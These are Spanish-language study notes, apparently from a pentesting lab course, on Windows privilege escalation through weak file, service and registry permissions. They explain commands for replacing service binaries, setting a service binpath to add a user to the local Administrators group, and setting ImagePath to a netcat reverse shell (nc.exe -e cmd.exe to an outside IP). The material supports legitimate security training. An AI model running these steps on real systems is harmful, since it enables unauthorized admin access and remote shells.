# Weak Permissions

## 1) Introducción

* Concepto: Las ACLs en Windows son complejas. Un pequeño cambio puede crear una vulnerabilidad en otra parte.
* Relevancia para pentesters: comprobar permisos débiles en ficheros, servicios y registro puede conducir a escalada de privilegios, especialmente porque muchos servicios se instalan para ejecutarse como SYSTEM.

---

## 2) Permissive File System ACLs — Comprobación con SharpUp

**Comando usado en el texto:**

```powershell
.\SharpUp.exe audit
```

**Explicación de sintaxis:**

* `.\SharpUp.exe` indica ejecutar el binario `SharpUp.exe` en el directorio actual. El prefijo `.\` es necesario en PowerShell/CLI cuando el ejecutable está en el directorio de trabajo y no en el PATH.
* `audit` es el argumento que indica a SharpUp que ejecute su chequeo de escalada de privilegios.

**Salida relevante:** SharpUp identifica servicios cuyos binarios son "modificables". En el ejemplo aparece `SecurityService` con `PathName` apuntando a `"C:\Program Files (x86)\PCProtect\SecurityService.exe"`. Eso significa que el servicio ejecuta ese binario al iniciarse.

---

## 3) Verificar permisos con `icacls`

**Comando usado en el texto:**

```powershell
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

**Explicación de sintaxis:**

* `icacls` es una herramienta de Windows para ver y cambiar ACLs de ficheros.
* La ruta se pasa entre comillas porque contiene espacios.

**Salida explicada:**

* `BUILTIN\Users:(I)(F)` y `Everyone:(I)(F)` indican que los grupos `Users` y `Everyone` tienen permiso `F` (Full control) sobre el fichero. `I` significa que la entrada es heredada.
* `NT AUTHORITY\SYSTEM:(I)(F)` y `BUILTIN\Administrators:(I)(F)` muestran que SYSTEM y Administradores también tienen control total.
* Resultado: cualquier usuario sin privilegios puede modificar ese fichero o reemplazarlo.

**Consecuencia práctica del ejemplo:** si el servicio puede ser arrancado por un usuario sin privilegios, ese usuario puede reemplazar el binario por uno malicioso (por ejemplo, generado con `msfvenom`) y luego iniciar el servicio para ejecutarlo como SYSTEM.

---

## 4) Reemplazar el binario del servicio (ejemplo en texto)

**Comandos:**

```cmd
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
sc start SecurityService
```

**Explicación de sintaxis:**

* `cmd /c` ejecuta un comando en `cmd.exe` y sale. Aquí se usa para ejecutar `copy` desde un entorno de comandos.
* `copy /Y origen destino` copia el fichero `origen` a `destino` sobrescribiendo sin pedir confirmación (`/Y`).
* `sc start SecurityService` arranca el servicio llamado `SecurityService` usando la utilidad `sc` (Service Controller).

**Objetivo:** reemplazar el ejecutable por uno malicioso y arrancar el servicio para ejecutar ese binario con los privilegios del servicio.

---

## 5) Weak Service Permissions — detección con SharpUp y AccessChk

### 5.1 Ejecutar SharpUp de nuevo

**Salida:** SharpUp muestra `WindscribeService` como servicio potencialmente modificable y su `PathName`.

### 5.2 Comprobar permisos sobre el servicio con AccessChk

**Comando:**

```cmd
accesschk.exe /accepteula -quvcw WindscribeService
```

**Explicación de sintaxis y flags:**

* `accesschk.exe` de Sysinternals enumera permisos efectivos sobre objetos securizables.
* `/accepteula` acepta el acuerdo de licencia para ejecutar la herramienta sin interactuar.
* `-q` omite el banner (quiet).
* `-u` suprime errores (suppress errors).
* `-v` modo verbose, muestra detalles.
* `-c` indica que se especifica el nombre de un servicio (en la versión del texto aparece unido `-quvcw`, donde `c` es "service name" y `w` indica mostrar sólo objetos con acceso de escritura). En conjunto: `-quvcw` es la combinación de flags usadas.
* `WindscribeService` es el nombre del servicio a inspeccionar.

**Salida relevante:**

* `NT AUTHORITY\Authenticated Users` tiene `SERVICE_ALL_ACCESS`, es decir, permiso completo sobre el servicio (lectura/escritura/control). Esto permite modificar la configuración del servicio, incluido el `ImagePath` o binpath.

---

## 6) Comprobar el grupo de administradores local

**Comando:**

```cmd
net localgroup administrators
```

**Explicación:** lista los miembros del grupo local `Administrators`.

**Salida:** el usuario `htb-student` no estaba en el grupo antes del exploit.

---

## 7) Cambiar la ruta binaria del servicio (binpath) con `sc config`

**Comando usado para cambiar el binpath a un comando que añada el usuario al grupo admin local:**

```cmd
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```

**Explicación de sintaxis:**

* `sc config <ServiceName> binpath="<comando>"` cambia la configuración del servicio, concretamente el valor `BINARY_PATH_NAME` que indica qué ejecutar al arrancar el servicio.
* La cadena del binpath está entre comillas porque contiene espacios. Se asigna un comando en lugar del ejecutable real: `cmd /c net localgroup administrators htb-student /add`.
* `cmd /c` ejecuta el comando `net localgroup ... /add` y sale.

**Resultado esperado:** `ChangeServiceConfig SUCCESS`.

---

## 8) Parar y arrancar el servicio para ejecutar el binpath malicioso

**Parar servicio:**

```cmd
sc stop WindscribeService
```

**Explicación:** intenta detener el servicio. En el texto se muestra el estado `STOP_PENDING` y otros campos informativos.

**Arrancar servicio:**

```cmd
sc start WindscribeService
```

**Resultado observado:** `StartService FAILED 1053` porque el `binpath` ahora apunta a un comando no válido para ese servicio. Sin embargo, Windows intenta ejecutar lo que aparece en el binpath; durante ese intento el comando `net localgroup administrators htb-student /add` se ejecuta y agrega el usuario al grupo Administradores locales antes de que el servicio falle.

**Consecuencia práctica:** tras este arranque fallido, el usuario `htb-student` aparece en la lista de administradores locales.

---

## 9) Ejemplo de servicio crítico: Windows Update Orchestrator (UsoSvc)

* Nota del texto: UsoSvc se ejecuta como `NT AUTHORITY\SYSTEM`. Antes del parche de CVE-2019-1322 era posible aprovechar permisos débiles para escalar a SYSTEM modificando el `ImagePath`.

---

## 10) Limpieza: revertir el `binpath`

**Revertir al binpath original:**

```cmd
sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

**Arrancar servicio de nuevo:**

```cmd
sc start WindScribeService
sc query WindScribeService
```

**Explicación:** restaurar el `binpath` al ejecutable legítimo y arrancar el servicio para dejarlo funcionando normalmente. `sc query` muestra el servicio en estado `Running`.

---

## 11) Unquoted Service Path — comportamiento y lista de rutas que Windows intentará

**Descripción del problema:** si la ruta del `BINARY_PATH_NAME` no está entre comillas y contiene espacios, Windows puede buscar e intentar ejecutar binarios imponiendo un orden que puede llevar a ejecución de un archivo malicioso creado por un atacante.

**Ejemplo de ruta sin comillas en el texto:**

```
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

**Orden de búsqueda que Windows intentarí:**

* `C:\Program` (Windows intentaría `C:\Program.exe` con la extensión implícita)
* `C:\Program Files` (Windows intentaría `C:\Program Files.exe`)
* `C:\Program Files (x86)\System` (Windows intentaría `C:\Program Files (x86)\System.exe`)
* `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64` (sin extensión, Windows asume `.exe`)

**Implicación:** si un atacante puede escribir alguno de esos ficheros y el servicio se inicia, podría ejecutarse un binario no deseado como SYSTEM. En la práctica crear archivos en `C:\` o en `Program Files` requiere privilegios administrativos, por lo que no siempre es explotable.

---

## 12) Buscar rutas sin comillas con `wmic`

**Comando:**

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\""
```

**Explicación paso a paso:**

* `wmic service get name,displayname,pathname,startmode` lista servicios con las columnas `name`, `displayname`, `pathname` y `startmode`.
* `| findstr /i "auto"` filtra para mostrar solo servicios de inicio automático (`Auto`).
* `| findstr /i /v "c:\windows\\"` excluye líneas que contengan `c:\windows\` (comúnmente servicios del sistema), la doble barra invertida es por el escaping en el ejemplo.
* `| findstr /i /v "\""` excluye líneas que contengan comillas, por lo tanto listará rutas sin comillas.

**Salida:** muestra servicios como `SystemExplorerHelpService` y `WindscribeService` con `PathName` sin comillas.

---

## 13) Permissive Registry ACLs — comprobar ACLs en el registro con AccessChk

**Comando usado en el texto:**

```cmd
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```

**Explicación:**

* `accesschk.exe /accepteula`: ejecutar la herramienta aceptando la EULA.
* `"mrb3n"` es el nombre de usuario cuya vista de permisos se quiere comprobar.
* `-k` indica que se comprueba una clave de registro.
* `-v` verbose.
* `-u` suprimir errores.
* `-q` omitir banner.
* `-s` mostrar los permisos de forma resumida (dependiendo de la versión; en el texto la combinación `-kvuqsw` incluye `-w` para mostrar sólo objetos con write access).
* `hklm\System\CurrentControlSet\services` es la rama del registro donde están configuraciones de servicios, incluida la `ImagePath`.

**Salida del ejemplo:** muestra que la clave `ModelManagerService` tiene `KEY_ALL_ACCESS` para el usuario consultado, es decir, puede modificar esa clave.

---

## 14) Cambiar `ImagePath` con PowerShell

**Comando del texto:**

```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

**Explicación de sintaxis:**

* `Set-ItemProperty` es un cmdlet de PowerShell para establecer el valor de una propiedad en un objeto, aquí una clave del registro.
* `-Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService` apunta a la clave de registro de servicio.
* `-Name "ImagePath"` especifica la propiedad a modificar.
* `-Value "..."` asigna el nuevo valor; en el ejemplo se pone una ruta a `nc.exe` con parámetros para intentar una conexión inversa.

**Consecuencia:** si el servicio se reinicia, Windows ejecutará lo que esté en `ImagePath` con privilegios del servicio (posible ejecución como SYSTEM si el servicio corre como LocalSystem).

---

## 15) Modifiable Registry Autorun Binary — comprobación de programas que se ejecutan al inicio

**Comando usado en el texto (PowerShell):**

```powershell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```

**Explicación de sintaxis:**

* `Get-CimInstance Win32_StartupCommand` consulta la clase WMI que contiene comandos/programas configurados para ejecutarse en el arranque o al inicio de sesión.
* `| select Name, command, Location, User` selecciona las columnas `Name`, `command`, `Location` y `User` para mostrar.
* `| fl` formatea la salida en estilo "list" (format-list) para facilitar la lectura.

**Salida de ejemplo en el texto:** muestra varias entradas como `OneDrive`, `Windscribe`, `SecurityHealth`, y `VMware User Process`, con su `command` y la `Location` del registro (por ejemplo `HKU\...\Run` o `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`).

**Relevancia:** si tenemos permisos para sobrescribir un binario apuntado por una de estas entradas o podemos escribir en la clave de registro correspondiente, podríamos conseguir ejecución al siguiente inicio o inicio de sesión del usuario afectado.

---

## 16) Referencias

El texto indica que existen posts y sitios con listados de múltiples ubicaciones de autorun en Windows. En este documento no se reproducen esas listas, solo se traduce y explica la sección presentada.


